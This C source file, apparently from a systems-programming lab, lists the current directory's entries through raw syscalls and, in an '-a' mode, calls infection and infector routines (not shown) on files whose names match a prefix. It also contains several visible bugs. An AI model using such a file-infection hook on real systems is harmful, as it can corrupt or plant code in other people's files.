#include "util.h"

#define BUF_SIZE 8196

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEAK 19
#define SYS_GETDENTS 141

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDRW 2
#define O_APPEND 1024
#define O_TRUNC 512
#define O_CREAT 64

typedef struct ent {
    int inode;   
    int offset;  
    short len; 
    char buf[];
} ent;

void exit(){
  system_call(SYS_EXIT, 0x55);
}

int main(int argc, char **argv)
{
	int i, num_of_bytes, count=0, fd, deb_mode=0, append_mode=0;
	char buffer[BUF_SIZE], *prefix=""/*, *curr_file*/;
  ent *entp=buffer;

  for (i = 1; i < argc; i++){
      if(strcmp(argv[i],"-D")==0)
        deb_mode=1;
      if(strncmp(argv[i], "-p",2)==0){
        prefix=&argv[i][2];
      }

      if(strncmp(argv[i], "-a",2)==0){
        append_mode=1;
        prefix=&argv[i][2];
      }  
  }
  fd = system_call(SYS_OPEN, ".", 0, 0777);
  if(deb_mode)
  {
    system_call(SYS_WRITE, STDERR, "ID: ", 4);
    system_call(SYS_WRITE, STDERR, itoa(SYS_READ), 1);
    system_call(SYS_WRITE, STDERR, ", RC: ", 6); 
    system_call(SYS_WRITE, STDERR, itoa(fd), 1); 
    system_call(SYS_WRITE, STDERR, '\n', 1);
  }

  num_of_bytes = system_call(SYS_GETDENTS, fd, entp, BUF_SIZE);

  if(deb_mode){
    system_call(SYS_WRITE, STDERR, "ID: ", 4);
    system_call(SYS_WRITE, STDERR, itoa(SYS_GETDENTS), 1);
    system_call(SYS_WRITE, STDERR, ", RC: ", 6); 
    system_call(SYS_WRITE, STDERR, itoa(num_of_bytes), 1); 
    system_call(SYS_WRITE, STDERR, '\n', 1);
  }

  while(count<num_of_bytes){
    if(strncmp(prefix, entp->buf, strlen(prefix))==0){
      if(append_mode){
        infection();
        infector(entp->buf);
      }
      system_call(SYS_WRITE, STDOUT, "File name is: ", 14);
      system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
      system_call(SYS_WRITE, STDOUT, "\n", 1);
      system_call(SYS_WRITE, STDOUT, " File type is: ", 15);
      system_call(SYS_WRITE, STDOUT, itoa(*(buffer + count +entp->len -1)), 1);
      

      system_call(SYS_WRITE, STDOUT, "\n", 1);

      if(deb_mode){
        system_call(SYS_WRITE, STDERR, "ID: ", sizeof("ID: "));
        system_call(SYS_WRITE, STDERR, itoa(SYS_WRITE), 1);
        system_call(SYS_WRITE, STDERR, ", Return code: ", sizeof(", Return code: "));
        system_call(SYS_WRITE, STDERR, itoa(1), 1);
        system_call(SYS_WRITE, STDERR, "\n", 1);
      }

    }
    count+=entp->len;
    entp=buffer+count;
  }
  return 0;
}